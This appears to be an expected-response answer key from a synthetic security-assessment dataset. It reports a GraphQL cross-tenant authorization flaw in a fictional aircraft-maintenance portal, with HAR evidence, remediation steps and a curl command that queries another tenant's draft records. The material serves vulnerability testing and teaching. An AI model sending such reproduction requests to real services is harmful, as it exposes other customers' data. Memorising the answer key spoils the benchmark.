# Expected Response

## System
- **Domain:** Aerospace / Aviation Maintenance
- **System:** WingTech Maintenance Portal
- **Example ID:** GQL-0176

## Priority Findings

### Finding 1: Aerospace Maintenance — Draft Resource Exposed via bulkResourceLookup Cross-Tenant Access (Pattern 10.5)
**Severity:** High
**Category:** Single-User / Draft / Non-Published Resource Access

**Summary:**
Per §4.0 (RISK-GQL-176): The `getResource` resolver fetches by `resourceId` only, without verifying `tenantId` ownership. Per §5.0 (Pattern 10.5 — draft/non-published resource access): `bulkResourceLookup` returns draft maintenance records belonging to other tenants. An attacker from `tenant-0c7a` queried `bulkResourceLookup(ids: ["R-2176", "R-1176", "R-3176"])` and received a draft record belonging to `tenant-5893`, including `CONFIDENTIAL-0c7a5893`. In Aerospace / Aviation Maintenance, exposure of draft maintenance records can compromise safety-critical repair workflows and regulatory compliance.

**Evidence from HAR:**
- Request: `POST https://api.wingtech-maintenance.example.com/graphql` (2026-04-13)
- JWT `x-tenant-id`: `tenant-0c7a`
- Query: `bulkResourceLookup(ids: ["R-2176", "R-1176", "R-3176"]) { resourceId tenantId data { sensitiveField } }`
- Response `200 OK`: `tenantId: "tenant-5893"`, `ownerId: "other-user-0c7a5893"`, `sensitiveField: "CONFIDENTIAL-0c7a5893"`, `internalNotes: "Internal data exposed"`
- `x-request-id: req-0c7a5893`

**Evidence Map:**

| Artifact | Location | Finding |
|---|---|---|
| context.txt §4.0 | RISK-GQL-176 | getResource resolver lacks tenantId ownership check |
| context.txt §5.0 | Pattern 10.5 | Draft resource returned to unauthorized tenant |
| HAR query | ids array | R-2176 cross-tenant lookup |
| HAR response | tenantId | tenant-5893 returned to tenant-0c7a |
| HAR response | sensitiveField | CONFIDENTIAL-0c7a5893 |
| HAR header | x-request-id | req-0c7a5893 |

## Steps to Reproduce

### Step 1 — bulkResourceLookup cross-tenant draft access (HAR)
```bash
curl -s -X POST https://api.wingtech-maintenance.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" -H "x-tenant-id: tenant-0c7a" \
  -d '{"query": "query { bulkResourceLookup(ids: [\"R-2176\", \"R-1176\", \"R-3176\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable:** Returns draft aerospace record for `tenant-5893` including `CONFIDENTIAL-0c7a5893`. **Secure:** FORBIDDEN — only records owned by `tenant-0c7a` returned.

## Remediation
1. Resolver: filter `WHERE resource_id = ANY($ids) AND tenant_id = $jwt.tenantId AND status != 'draft'`.
2. Draft records must only be accessible by their owning tenant's users.
3. Redis cache key: `resource:{tenantId}:{resourceId}` to prevent cross-tenant cache poisoning.
